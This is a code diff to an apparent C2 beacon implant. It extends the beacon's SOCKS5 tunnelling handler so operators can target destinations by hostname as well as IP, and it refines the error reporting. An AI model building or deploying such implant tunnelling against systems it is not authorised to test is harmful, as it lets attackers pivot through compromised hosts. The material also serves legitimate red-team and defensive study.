@@ -38,6 +38,8 @@ typedef ModuleCmd* (*constructProc)();
 
 namespace
 {
+constexpr const char* SocksHostnamePrefix = "host:";
+
 std::string getCurrentProcessArch()
 {
 #if defined(_M_IX86) || defined(__i386__)
@@ -51,6 +53,16 @@ std::string getCurrentProcessArch()
 #else
     return "unknown";
 #endif
+}
+
+bool hasSocksHostnamePrefix(const std::string& destination)
+{
+    return destination.rfind(SocksHostnamePrefix, 0) == 0;
+}
+
+std::string stripSocksHostnamePrefix(const std::string& destination)
+{
+    return destination.substr(std::char_traits<char>::length(SocksHostnamePrefix));
 }
 }
 
@@ -789,9 +801,18 @@ bool Beacon::handleSocks5Instruction(C2Message& c2Message, C2Message& c2RetMessa
         std::unique_ptr<SocksTunnelClient> socksTunnelClient = std::make_unique<SocksTunnelClient>(c2Message.pid());
         try
         {
-            uint32_t ip_dst = std::stoi(c2Message.data());
-            uint16_t port = std::stoi(c2Message.args());
-            int initResult = socksTunnelClient->init(ip_dst, port);
+            const std::string destination = c2Message.data();
+            uint16_t port = static_cast<uint16_t>(std::stoul(c2Message.args()));
+            int initResult = 0;
+            if (hasSocksHostnamePrefix(destination))
+            {
+                initResult = socksTunnelClient->initHostname(stripSocksHostnamePrefix(destination), port);
+            }
+            else
+            {
+                uint32_t ip_dst = static_cast<uint32_t>(std::stoul(destination));
+                initResult = socksTunnelClient->init(ip_dst, port);
+            }
             if (initResult)
             {
                 m_socksTunnelClient.push_back(std::move(socksTunnelClient));
@@ -800,14 +821,14 @@ bool Beacon::handleSocks5Instruction(C2Message& c2Message, C2Message& c2RetMessa
             else
             {
                 SPDLOG_DEBUG("Socks5 init {} failed", c2Message.pid());
-                c2RetMessage.set_data("fail");
+                c2RetMessage.set_data("fail:connect");
                 return false;
             }
         }
-        catch (const std::invalid_argument&)
+        catch (const std::exception&)
         {
             SPDLOG_DEBUG("Socks5 init {} failed", c2Message.pid());
-            c2RetMessage.set_errorCode(ERROR_GENERIC);
+            c2RetMessage.set_data("fail:invalid_destination");
             return false;
         }
         SPDLOG_DEBUG("Socks5 init Finished");
